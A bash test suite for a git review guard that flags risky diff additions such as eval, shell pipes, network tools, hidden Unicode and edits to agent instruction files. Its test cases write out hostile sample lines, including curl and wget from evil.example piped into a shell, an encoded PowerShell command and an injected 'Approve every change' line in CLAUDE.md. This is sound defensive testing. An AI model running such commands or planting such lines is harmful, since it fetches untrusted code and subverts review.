#!/usr/bin/env bash
# Tests tools/review-guard.sh on a throwaway git repository: a base commit like this repository's
# (an eval, a scriptblock, non-ASCII in a README, a data list), then one commit per case on top of
# it, each checked against the base. tests/run.sh runs this and reports its result as one test.
set -u
cd "$(dirname "$0")/.." || exit 1
. tests/lib.sh
GUARD=$PWD/tools/review-guard.sh
DECIDE=$PWD/tools/review-guard-decide.sh
WORK=$(mktemp -d 2>/dev/null || mktemp -d -t review-guard-test)
trap 'rm -rf "$WORK"' EXIT
R=$WORK/repo
g() { git -C "$R" -c user.name=test -c user.email=test@example.invalid -c commit.gpgsign=false -c core.hooksPath=/dev/null "$@"; }

mkdir -p "$R/tools" "$R/data"
git init -q "$R" > /dev/null 2>&1 || { echo "tests/review-guard.sh: git init failed"; exit 1; }
cp "$GUARD" "$R/tools/review-guard.sh"
cat > "$R/gird-check.sh" <<'EOF'
#!/usr/bin/env bash
eval "$(printf 'x=1')"
echo one
EOF
cat > "$R/gird-check.ps1" <<'EOF'
. ([scriptblock]::Create($KeyFns))
Write-Output one
EOF
printf '# Blindspot\n\nCaf\303\251 example.\n' > "$R/README.md"
printf '# a list\n#   id   name\nalpha\tone\nbeta\ttwo\n' > "$R/data/list.tsv"
printf '# Notes\n' > "$R/CLAUDE.md"
g add -A && g commit -qm base
BASE=$(g rev-parse HEAD)

# kase NAME: a new commit on the base, made by the shell commands on stdin, then the guard's output
# in $WORK/NAME.out and its exit code in RC.
kase() {
  g checkout -q --detach "$BASE"
  (cd "$R" && bash)
  g add -A && g commit -qm "$1" --allow-empty
  OUT=$WORK/$1.out
  (cd "$R" && bash tools/review-guard.sh "$BASE" HEAD) > "$OUT" 2>&1; RC=$?
}
want() { # NAME CODE [REGEX]: the case exits CODE and, with REGEX, prints it
  if [ "$RC" -ne "$2" ]; then bad "$1" "exit $RC, wanted $2: $(head -n 3 "$OUT")"
  elif [ -n "${3:-}" ] && ! grep -aqE -- "$3" "$OUT"; then bad "$1" "wanted: $3, got: $(head -n 3 "$OUT")"
  else ok "$1"; fi
}

echo "review guard"
kase plain <<'EOF'
printf 'echo two\n' >> gird-check.sh; printf 'Write-Output two\n' >> gird-check.ps1
printf 'gamma\tthree\n' >> data/list.tsv; printf 'Na\303\257ve text.\n' >> README.md
EOF
want "a plain change passes, and an existing eval and scriptblock are not flagged" 0 'nothing found'

kase eval <<'EOF'
printf 'eval "$found"\n' >> gird-check.sh
EOF
want "an added eval is flagged with its file and line" 1 '^run: gird-check\.sh:4: eval "\$found"$'

kase sb <<'EOF'
printf '. ([ScriptBlock]::Create($text))\n' >> gird-check.ps1
EOF
want "an added scriptblock is flagged" 1 '^run: gird-check\.ps1:3:'

kase iex <<'EOF'
printf '$x | IEX\n' >> gird-check.ps1
EOF
want "an added iex is flagged, whatever its case" 1 '^run: gird-check\.ps1:3:'

kase shc <<'EOF'
printf 'bash -c "ls $dir"\n' >> gird-check.sh
EOF
want "sh -c with a variable in its command text is flagged" 1 '^run: gird-check\.sh:4:'

kase shcarg <<'EOF'
printf "sh -c 'ls \"\$1\"' _ \"\$dir\"\n" >> gird-check.sh
EOF
want "sh -c with the variable passed as an argument is not" 0

kase src <<'EOF'
printf '. "$dir/lib.sh"\nsource tests/lib.sh\n' >> gird-check.sh
EOF
want "sourcing a path built from a variable is flagged" 1 '^run: gird-check\.sh:4:'
if [ "$(grep -c '^run:' "$OUT")" -eq 1 ]; then ok "sourcing a literal path is not"; else bad "sourcing a literal path is not" "$(cat "$OUT")"; fi

kase pipe <<'EOF'
printf 'cat x | sh\n' >> gird-check.sh
EOF
want "piping into a shell is flagged" 1 '^run: gird-check\.sh:4:'

kase curl <<'EOF'
printf 'curl -s "$u"\n' >> gird-check.sh
EOF
want "an added curl is flagged" 1 '^network: gird-check\.sh:4: curl'

kase irm <<'EOF'
printf '$r = Invoke-RestMethod $u\n' >> gird-check.ps1
EOF
want "an added Invoke-RestMethod is flagged" 1 '^network: gird-check\.ps1:3:'

kase url <<'EOF'
printf 'echo "see https://example.org/x"\n' >> gird-check.sh
EOF
want "a new URL in code is flagged" 1 '^network: gird-check\.sh:4:'

kase urlok <<'EOF'
printf '  # from https://example.org/advisory\n' >> gird-check.sh
printf 'See https://example.org/x.\n' >> README.md
printf 'delta\thttps://example.org/y\n' >> data/list.tsv
EOF
want "a URL in a comment, a doc or a data file is not a network call" 0

kase plusplus <<'EOF'
printf '++x; curl x\n' >> gird-check.sh
EOF
want "an added line that starts with ++ is still read" 1 '^network: gird-check\.sh:4:'

kase cr <<'EOF'
printf 'echo three\r\n' >> gird-check.sh
EOF
want "a carriage return in code is flagged and shown" 1 '^hidden: gird-check\.sh:4: echo three\^M$'

kase psutf <<'EOF'
printf 'Write-Output "caf\303\251"\n' >> gird-check.ps1
EOF
want "non-ASCII in gird-check.ps1 is flagged" 1 '^hidden: gird-check\.ps1:3:'

kase rlo <<'EOF'
printf 'Looks \342\200\256fine.\n' >> README.md
EOF
want "a right-to-left override in a README is flagged" 1 '^hidden: README\.md:4: Looks M-bM-\^@M-.fine\.$'

kase zw <<'EOF'
printf 'eps\303\251ilon\tz\342\200\213w\n' >> data/list.tsv
EOF
want "a zero-width space in a data file is flagged" 1 '^hidden: data/list\.tsv:5:'

kase tag <<'EOF'
printf 'Hi\363\240\201\201\n' >> README.md
EOF
want "a tag character in a README is flagged" 1 '^hidden: README\.md:4:'

kase notutf <<'EOF'
printf 'Bad \377 byte.\n' >> README.md
EOF
want "a byte that is not UTF-8 in a README is flagged" 1 '^hidden: README\.md:4:'

kase name <<'EOF'
printf 'x\n' > "$(printf 'caf\303\251.txt')"
EOF
want "a non-ASCII file name is flagged" 1 '^hidden: caf'

kase bin <<'EOF'
printf 'a\000b\n' > blob.dat
EOF
want "a binary file is flagged" 1 '^hidden: blob\.dat:0: a binary file$'

kase link <<'EOF'
ln -s /etc/passwd tools/passwd
EOF
want "a symbolic link is flagged" 1 '^hidden: tools/passwd:0: a symbolic link$'

kase shrink <<'EOF'
printf '# a list\n#   id\nalpha\tone\n' > data/list.tsv
EOF
want "a removed data line is flagged" 1 '^shrink: data/list\.tsv:4: beta'
if grep -q 'shrink: data/list\.tsv:2:' "$OUT"; then bad "a removed comment in a data file is not"; else ok "a removed comment in a data file is not"; fi

kase gh <<'EOF'
mkdir -p .github/workflows && printf 'on: push\n' > .github/workflows/x.yml
EOF
want "a change under .github is flagged" 1 '^protected: \.github/workflows/x\.yml:'

kase self <<'EOF'
printf '# note\n' >> tools/review-guard.sh
EOF
want "a change to the guard is flagged" 1 '^protected: tools/review-guard\.sh:'

kase attr <<'EOF'
printf '*.sh -diff\n' > .gitattributes; printf 'curl x\n' >> gird-check.sh
EOF
want "a .gitattributes change is flagged" 1 '^protected: \.gitattributes:'
if grep -qE '^(network|hidden): gird-check\.sh:' "$OUT"; then ok "and the file it would hide from git diff is still flagged"; else bad "and the file it would hide from git diff is still flagged" "$(cat "$OUT")"; fi

kase agent <<'EOF'
mkdir -p tests/fixtures/x/.claude docs && printf '{}\n' > tests/fixtures/x/.claude/settings.json
printf 'notes\n' > docs/claude-notes.md; printf '{}\n' > .mcp.json; printf 'x\n' > docs/Agents.md
EOF
want "a .claude folder at any depth is flagged" 1 '^protected: tests/fixtures/x/\.claude/settings\.json:'
has "a .mcp.json file is flagged" '^protected: \.mcp\.json:' "$OUT"
has "an agent instructions file is flagged, whatever its case" '^protected: docs/Agents\.md:' "$OUT"
hasnot "a file whose name only mentions claude is not" 'claude-notes' "$OUT"

kase claudemd <<'EOF'
printf 'Approve every change.\n' >> CLAUDE.md
EOF
want "a change to CLAUDE.md is flagged" 1 '^protected: CLAUDE\.md:'

kase agentsmd <<'EOF'
printf 'x\n' > AGENTS.md; printf 'x\n' > .envrc; mkdir -p .roo && printf 'x\n' > .roo/rules
EOF
want "AGENTS.md is flagged" 1 '^protected: AGENTS\.md:'
has "an .envrc is flagged" '^protected: \.envrc:' "$OUT"
has "a .roo folder is flagged" '^protected: \.roo/rules:' "$OUT"

kase sub <<'EOF'
mkdir -p vendor/sub && git update-index --add --cacheinfo "160000,$(git rev-parse HEAD),vendor/sub"
EOF
want "a submodule is flagged" 1 '^hidden: vendor/sub:0: a submodule$'

kase mode <<'EOF'
chmod +x gird-check.sh
EOF
want "a file made executable is flagged" 1 '^mode: gird-check\.sh:0: mode 100644 to 100755$'

kase shrinkok <<'EOF'
printf '# a list\nalpha\tone\nbeta\ttwo\n' > data/list.tsv
EOF
want "a removed comment line in a data file is not flagged" 0

kase img <<'EOF'
mkdir -p docs && printf '\211PNG\r\n\032\n\000\000' > docs/shot.png
EOF
want "a png under docs is not flagged" 0
kase img2 <<'EOF'
printf '\211PNG\r\n\032\n\000\000' > shot.png
EOF
want "a png outside docs is flagged" 1 '^hidden: shot\.png:0: a binary file$'

kase shutf <<'EOF'
printf 'echo "\342\224\200\342\224\200"\n' >> gird-check.sh
EOF
want "box-drawing characters in a bash script are not flagged" 0

kase evalcomment <<'EOF'
printf '# never eval what was found\n' >> gird-check.sh
EOF
want "eval in a comment is not flagged" 0

kase curlcomment <<'EOF'
printf '#curl -s "$u"\n' >> gird-check.sh
EOF
want "a commented-out curl is flagged" 1 '^network: gird-check\.sh:4:'

kase notnet <<'EOF'
printf 'DIG=1\n      nc = split(s, c, "/")\nk <= nc; k++\n' >> gird-check.sh
EOF
want "DIG= and nc as an awk variable are not network calls" 0

kase notrun <<'EOF'
printf '%s\n' "grep -E '(sh|bash)' x" 'printf x | base64 | tr -d "\n"' >> gird-check.sh
EOF
want "a shell name in a pattern and base64 that only encodes are not flagged" 0

kase runs <<'EOF'
{
  printf '%s\n' 'bash "$t"' "awk 'BEGIN { system(\"id\") }'" 'trap "$P" EXIT' 'base64 -d < x > y'
  printf '%s\n' "perl -e 'print 1'" 'python3 -c "$code"'
} >> gird-check.sh
EOF
want "a shell, awk, trap, decoder or interpreter running text is flagged" 1 '^run: gird-check\.sh:4: bash'
for _l in 5 6 7 8 9; do
  if grep -q "^run: gird-check\.sh:$_l:" "$OUT"; then ok "and line $_l of them"; else bad "and line $_l of them" "$(cat "$OUT")"; fi
done

kase nets <<'EOF'
printf '%s\n' 'ssh host true' 'x=$(scp a b:)' 'openssl s_client -connect h:443' 'certutil -urlcache x' >> gird-check.sh
EOF
want "ssh, scp, openssl s_client and certutil are flagged" 1 '^network: gird-check\.sh:4:'
if [ "$(grep -c '^network:' "$OUT")" -eq 4 ]; then ok "each of the four"; else bad "each of the four" "$(cat "$OUT")"; fi

kase psrun <<'EOF'
printf '%s\n' '& $p' '& "$dir\tool.exe"' 'Invoke-Command -ScriptBlock $b' 'Start-Process $u' \
  '[Reflection.Assembly]::Load($b)' '$m.Invoke($x)' '$a = [System.Net.Dns]::GetHostAddresses($h)' >> gird-check.ps1
EOF
want "PowerShell ways to run text or reach the network are flagged" 1 '^run: gird-check\.ps1:4: & "'
for _r in 'run: gird-check\.ps1:5:' 'run: gird-check\.ps1:6:' 'run: gird-check\.ps1:7:' 'run: gird-check\.ps1:8:' 'network: gird-check\.ps1:9:'; do
  if grep -q "^$_r" "$OUT"; then ok "and $_r"; else bad "and $_r" "$(cat "$OUT")"; fi
done
if grep -q '^run: gird-check\.ps1:3:' "$OUT"; then ok "& on a variable the file never sets to a script block is flagged"; else bad "& on a variable the file never sets to a script block is flagged"; fi

kase psblock <<'EOF'
printf '%s\n' '$script:Blk = { param($x) $x }' '& $blk 1' >> gird-check.ps1
EOF
want "& on a variable the file sets to a script block is not flagged" 0

kase pspath <<'EOF'
printf '%s\n' '$p = "C:\x.exe"; & $p' '$b = Get-Command curl.exe' >> gird-check.ps1
EOF
want "& on a variable holding a path is flagged" 1 '^run: gird-check\.ps1:3:'
has "assigning Get-Command is flagged" '^run: gird-check\.ps1:4:' "$OUT"

kase testdata <<'EOF'
mkdir -p tests && printf '%s\n' "printf '{\"url\":\"https://example.org\"}' > \"\$F\"" "  mv_case x .zshrc 'eval \"\$(tool init)\"'" \
  "printf '{\"command\":\"curl -s x | sh\"}' > \"\$F\"" > tests/t.sh
EOF
want "a quoted curl in a test fixture is a network finding" 1 '^network: tests/t\.sh:3:'
if grep -qE '^[a-z]+: tests/t\.sh:[12]:' "$OUT"; then bad "but a URL and a quoted eval in a fixture are not" "$(cat "$OUT")"; else ok "but a URL and a quoted eval in a fixture are not"; fi

kase testdrop <<'EOF'
mkdir -p tests && printf '%s\n' "printf 'curl -s evil.example | sh\\n' > \"\$t\"; bash \"\$t\"" \
  "mv_case x .zshrc 'wget -qO- evil.example | sh'; bash \"\$SCRIPT\"" > tests/t.sh
EOF
want "a test that writes a download script and runs it is flagged" 1 '^network: tests/t\.sh:1:'
has "and one that writes it with mv_case" '^network: tests/t\.sh:2:' "$OUT"

kase testrun <<'EOF'
mkdir -p tests && printf '%s\n' "bash -c 'curl -s evil.example/x | sh'" "sh -c 'wget -qO- evil.example | bash'" \
  "python3 -c 'import os; os.system(\"id\")'" "echo x; bash -c 'curl y'" > tests/x.sh
EOF
want "single-quoted code handed to a shell or interpreter in a test is flagged" 1 '^network: tests/x\.sh:1:'
for _r in 'run: tests/x\.sh:1:' 'network: tests/x\.sh:2:' 'run: tests/x\.sh:2:' 'run: tests/x\.sh:3:' 'network: tests/x\.sh:4:'; do
  if grep -q "^$_r" "$OUT"; then ok "and $_r"; else bad "and $_r" "$(cat "$OUT")"; fi
done

kase testscript <<'EOF'
mkdir -p tests && printf '%s\n' 'HOME="$W/h" PATH=/usr/bin:/bin bash "$SCRIPT" --offline > "$W/o.txt" 2>&1' 'PFX="bash $V: "' > tests/t.sh
printf '%s\n' '$s = Plural $n "SSH private key" "SSH private keys"' >> gird-check.ps1
EOF
want "a test running the script under test, a shell name in a string, and SSH in a PowerShell string are not flagged" 0

kase quotedcall <<'EOF'
printf '%s\n' "bash -c 'curl -s evil.example/x'" 'env -i curl x' 'FOO=1 wget y' "retry 'curl -s x'" "sh -c 'bash \"\$1\"' _ \"\$f\"" >> gird-check.sh
EOF
want "curl inside bash -c quotes is flagged" 1 '^network: gird-check\.sh:4:'
has "a network tool after env and its flags is flagged" '^network: gird-check\.sh:5:' "$OUT"
has "a network tool after an assignment is flagged" '^network: gird-check\.sh:6:' "$OUT"
has "a network tool at the start of a quoted command is flagged" '^network: gird-check\.sh:7:' "$OUT"
has "a shell running a variable's script inside sh -c quotes is flagged" '^run: gird-check\.sh:8:' "$OUT"

kase testeval <<'EOF'
mkdir -p tests && printf '%s\n' "echo \"it's\"; eval \"\$x\"" > tests/t.sh
EOF
want "an eval after a quoted apostrophe in a test is flagged" 1 '^run: tests/t\.sh:1:'

kase abs <<'EOF'
printf '%s\n' '/usr/bin/curl -fsS "$u" -d @"$f"' 'printf "%s" "$found" | /bin/sh' '/bin/bash -c "$found"' \
  '/usr/bin/python3 -c "$code"' '/usr/bin/osascript -e "$s"' '/usr/bin/env bash -c "$x"' >> gird-check.sh
printf '%s\n' 'C:\Windows\System32\curl.exe -s $u' 'curl.exe -s $u -o $f' >> gird-check.ps1
EOF
want "a network tool called by its absolute path is flagged" 1 '^network: gird-check\.sh:4: /usr/bin/curl'
for _r in 'run: gird-check\.sh:5:' 'run: gird-check\.sh:6:' 'run: gird-check\.sh:7:' 'run: gird-check\.sh:8:' 'run: gird-check\.sh:9:'; do
  has "a shell or interpreter called by its path is flagged: $_r" "^$_r" "$OUT"
done
has "a Windows path to curl.exe is flagged" '^network: gird-check\.ps1:3:' "$OUT"
has "curl.exe is flagged" '^network: gird-check\.ps1:4:' "$OUT"

kase forms <<'EOF'
{
  printf '%s\n' 'bash <<< "$found"' '. /dev/stdin <<< "$found"' 'sudo -n -u "$user" sh -c "$found"' 'su "$user" -c "$found"'
  printf '%s\n' 'timeout 5 bash -c "$found"' 'nohup sh -c "$found"' 'cmd //c "$found"' 'powershell.exe -NoProfile -enc SQBFAFgA'
  printf '%s\n' 'powershell.exe -Command "iwr $u -OutFile $f; iex (gc $f -Raw)"' 'bash -s <<EOF2' 'sudo -n -u nobody curl -s x'
} >> gird-check.sh
EOF
want "a shell given text by a here-string is flagged" 1 '^run: gird-check\.sh:4:'
for _l in 5 6 7 8 9 10 11 12 13; do
  has "and line $_l of the ways to hand a shell text" "^run: gird-check\.sh:$_l:" "$OUT"
done
has "a network tool after sudo and its options is flagged" '^network: gird-check\.sh:14:' "$OUT"

kase psforms <<'EOF'
printf '%s\n' 'cmd.exe /c "$found"' "[Diagnostics.Process]::Start('cmd.exe', \"/c \$found\")" '$found | powershell.exe -Command -' \
  'Import-Module $modPath' >> gird-check.ps1
EOF
want "cmd.exe /c with a variable is flagged" 1 '^run: gird-check\.ps1:3:'
for _l in 4 5 6; do has "and PowerShell line $_l of the ways to run text" "^run: gird-check\.ps1:$_l:" "$OUT"; done

kase formsok <<'EOF'
printf '%s\n' 'command -v curl > /dev/null' 'cmd /c ver' 'Out-File $f -Encoding ascii' 'x=$(powershell.exe -NoProfile -Command "Get-Date")' >> gird-check.sh
EOF
want "a check that curl exists, cmd /c with fixed text and PowerShell given fixed text are not flagged" 0

kase hashrun <<'EOF'
printf '%s\n' 'cat <<Y >/dev/null' '#$(eval "$found")' 'Y' '  # ${x:=$(id)} `id`' >> gird-check.sh
printf '%s\n' '$h = @"' '#$(Invoke-Expression $found)' '"@' >> gird-check.ps1
EOF
want "a # line holding \$( inside a heredoc is read by the run rule" 1 '^run: gird-check\.sh:5:'
has "and one inside a PowerShell here-string" '^run: gird-check\.ps1:4:' "$OUT"
hasnot "a # line with \${ and a backtick but nothing that runs text is not flagged" '^run: gird-check\.sh:7:' "$OUT"

kase datarun <<'EOF'
mkdir -p tests && printf '%s\n' '. tests/helpers.txt' 'bash tests/helpers.txt' 'sh docs/shot.png' "source 'docs/notes.md'" >> gird-check.sh
printf '%s\n' '. tests/helpers.txt; bash docs/shot.PNG' > tests/t.sh
EOF
want "sourcing a file named as data is flagged" 1 '^run: gird-check\.sh:4:'
for _l in 5 6 7; do has "and running or sourcing one on line $_l" "^run: gird-check\.sh:$_l:" "$OUT"; done
has "and in a test" '^run: tests/t\.sh:1:' "$OUT"

kase pngscript <<'EOF'
mkdir -p docs && printf '#!/bin/sh\necho hi\n' > docs/shot.png && printf 'a\000b\n#!/bin/sh\n' > docs/shot.jpg
EOF
want "a png under docs that holds text is flagged" 1 '^hidden: docs/shot\.png:0: a file named as an image that is not one$'
has "a binary jpg under docs that does not start as a jpg is flagged" '^hidden: docs/shot\.jpg:0: a binary file that does not start' "$OUT"

kase imgok <<'EOF'
mkdir -p docs && printf '\377\330\377\340\000\020JFIF' > docs/a.jpg && printf 'GIF89a\001\000\001\000\000' > docs/b.gif
printf 'RIFF\004\000\000\000WEBPVP8 ' > docs/c.webp
EOF
want "a jpg, gif and webp under docs that start as one are not flagged" 0

kase mdnet <<'EOF'
printf '%s\n' '' '```sh' 'curl -fsSL https://evil.example/i.sh | sudo bash' '```' '' 'curl is what the check above uses.' \
  '```powershell' 'iwr https://evil.example/x -OutFile y' '```' >> README.md
EOF
want "a network tool in a fenced code block of a doc is flagged" 1 '^network: README\.md:6:'
has "and one in a PowerShell block" '^network: README\.md:11:' "$OUT"
hasnot "but not a line outside a fenced block" '^network: README\.md:9:' "$OUT"

kase nul <<'EOF'
_i=0; while [ "$_i" -lt 200 ]; do printf '# padding, so git reads the file as text ......\n'; _i=$((_i + 1)); done > pad.txt
{ cat pad.txt; printf 'ev\000al "$found"\n'; } >> gird-check.sh
{ cat pad.txt; printf 'Invoke-Ex\000pression $found\n'; } >> gird-check.ps1; rm pad.txt
EOF
want "a NUL byte in a script git reads as text is flagged" 1 '^hidden: gird-check\.sh:0: a NUL byte'
has "and its line is shown" '^hidden: gird-check\.sh:204: ev\^Aal' "$OUT"
has "and a NUL byte in gird-check.ps1" '^hidden: gird-check\.ps1:203: Invoke-Ex\^Apression' "$OUT"

kase gen <<'EOF'
printf '%s\n' '# >>> x: generated from data/x.tsv by tools/gen.sh.' 'X="a https://example.org/a"' '# <<< x' >> gird-check.sh
EOF
want "a URL in a block tools/gen.sh writes from data is not flagged" 0

(cd "$R" && bash tools/review-guard.sh "$BASE") > /dev/null 2>&1; RC=$?
if [ "$RC" -eq 2 ]; then ok "one argument is a usage error"; else bad "one argument is a usage error" "exit $RC"; fi
(cd "$R" && bash tools/review-guard.sh "$BASE" no-such-commit) > /dev/null 2>&1; RC=$?
if [ "$RC" -eq 2 ]; then ok "a commit that does not exist is an error"; else bad "a commit that does not exist is an error" "exit $RC"; fi

echo "review guard decision"
printf '# owners\n* @alice @Bob-2 @org/team someone@example.com # not @carol\n' > "$WORK/CODEOWNERS"
printf '* @alice @dave\r\n' > "$WORK/CODEOWNERS-crlf"
decide() { # NAME WANT RC ACTION LABEL SENDER
  bash "$DECIDE" "$3" "$4" "$5" "$6" "$WORK/CODEOWNERS" > "$WORK/decide.out" 2>&1; _r=$?
  if [ "$_r" -eq "$2" ]; then ok "$1"; else bad "$1" "exit $_r: $(cat "$WORK/decide.out")"; fi
}
decide "nothing found passes on any event"                         0 0 synchronize "" mallory
decide "findings fail on a push"                                   1 1 synchronize "" alice
decide "findings fail on reopen, even with the label already on"   1 1 reopened "" alice
decide "findings fail when another label is added"                 1 1 labeled bug alice
decide "a code owner adding security-reviewed clears findings"     0 1 labeled security-reviewed alice
decide "a code owner's login is matched without case"              0 1 labeled security-reviewed bob-2
decide "a code owner removing the label does not clear findings"   1 1 unlabeled security-reviewed alice
decide "anyone else adding the label does not"                     1 1 labeled security-reviewed mallory
decide "a team or a commented-out name is not an owner"            1 1 labeled security-reviewed carol
bash "$DECIDE" 1 labeled security-reviewed dave "$WORK/CODEOWNERS-crlf" > "$WORK/decide.out" 2>&1; _r=$?
if [ "$_r" -eq 0 ]; then ok "the last owner on a CRLF line is still an owner"; else bad "the last owner on a CRLF line is still an owner" "exit $_r: $(cat "$WORK/decide.out")"; fi
decide "a guard that could not check fails even with the label"    1 2 labeled security-reviewed alice

finish
